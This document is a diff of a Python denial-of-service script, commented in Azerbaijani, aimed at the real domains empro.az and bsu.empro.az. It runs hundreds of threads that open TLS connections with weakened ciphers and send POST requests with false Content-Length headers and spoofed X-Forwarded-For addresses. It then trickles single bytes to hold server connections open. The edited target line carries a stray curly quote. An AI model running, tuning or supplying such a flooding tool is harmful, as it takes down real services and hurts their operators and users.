@@ -3,26 +3,24 @@ import ssl
 import threading
 import random
 import time
+import string
 import os
 
-# ==========================================
-# 🎯 HƏDƏFİ BURADA DƏYİŞ (Target Host)
-TARGET_HOST = "empro.az" 
+# --- HƏDƏF ---
+TARGET_HOST = "bsu.empro.az”
 TARGET_PORT = 443
-# ==========================================
+THREADS = 800 # Railway Paid üçün maksimal stabil güc
 
-THREADS = 1500 # Railway Paid üçün maksimal şəbəkə sıxlığı
+def r_str(n=15):
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def r_str(n=30):
-    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
-
-def internal_corruption():
-    # SSL Handshake motorunu rəsmi dövlət qurumları kimi (JA3) təqlid edirik
+def final_strike():
+    # SSL/TLS Handshake-i serveri kilitləmək üçün 'Ağır' tənzimləyirik
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    # Şifrələməni serverin daxili prosessorunu ən çox yoran üsulda saxlayırıq (CPU Killer)
-    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
+    # Şifrələməni serverin CPU-sunu ən çox yoran üsulda saxlayırıq (RSA-AES)
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
 
     while True:
         try:
@@ -31,49 +29,48 @@ def internal_corruption():
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.settimeout(5)
 
+            # SSL bağlantısını qur və serveri CPU hesablamağa məcbur et
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # --- SİR BURADADIR (SLOW-WRITE BUFFER EXPLOIT) ---
-            # Serverə yalan deyirik: 100 MB data göndəririk (Content-Length)
-            # Bu, serverin daxili RAM-ını kilitləmək üçün 'Genocide' metodudur.
-            for _ in range(500):
-                path = f"/?v={time.time()}&id={r_str(40)}&q={r_str(80)}"
+            # Serveri daxili bazadan vurmaq üçün ağır müraciət
+            # Content-Length hiləsi ilə bağlantını 'zombi' vəziyyətinə salırıq
+            for _ in range(200):
+                path = f"/?v={time.time()}&id={r_str(32)}&invite_code={random.randint(1000, 9999)}"
                 ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                 
-                # Malformed Header Strike: Cloudflare analitikasını donduran başlıqlar
-                header = (
+                payload = (
                     f"POST {path} HTTP/1.1\r\n"
                     f"Host: {TARGET_HOST}\r\n"
                     f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
                     f"X-Forwarded-For: {ip}\r\n"
                     f"Content-Type: application/x-www-form-urlencoded\r\n"
-                    f"Content-Length: 104857600\r\n" # 100 Megabyte "Yalançı" yük
-                    f"Connection: Keep-Alive\r\n"
+                    f"Content-Length: 1048576\r\n" # 1 Megabyte yalançı yük
+                    f"Connection: keep-alive\r\n"
                     f"\r\n"
                 ).encode()
 
-                conn.sendall(header)
-                # Serveri asılı saxlamaq üçün yarımçıq paketlər
+                conn.sendall(payload)
+                # Serveri kilitləyən zərbə: Yarımçıq data göndəririk
                 conn.send(os.urandom(1)) 
             
-            # Bağlantını bağlamırıq, port port kilitləyirik
+            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
             time.sleep(2)
             conn.close()
         except:
             pass
 
 def main():
-    print(f"☢️  INTERNAL CORRUPTION ACTIVATED: {TARGET_HOST}")
-    print("[!] Target Protocol Layer: Shredding SSL Buffer & Memory Table...")
+    print(f"☢️  VOID-NULL PROTOCOL ACTIVATED: {TARGET_HOST}")
+    print("[!] Target Buffer is being saturated at the protocol level.")
     
     for i in range(THREADS):
-        t = threading.Thread(target=internal_corruption)
+        t = threading.Thread(target=final_strike)
         t.daemon = True
         t.start()
         if i % 100 == 0:
-            print(f"[*] Warhead {i} deployed into Core Memory...")
-            time.sleep(0.1)
+            print(f"[*] {i} Protocol Warheads Active...")
+            time.sleep(0.5)
 
     while True:
         time.sleep(1)
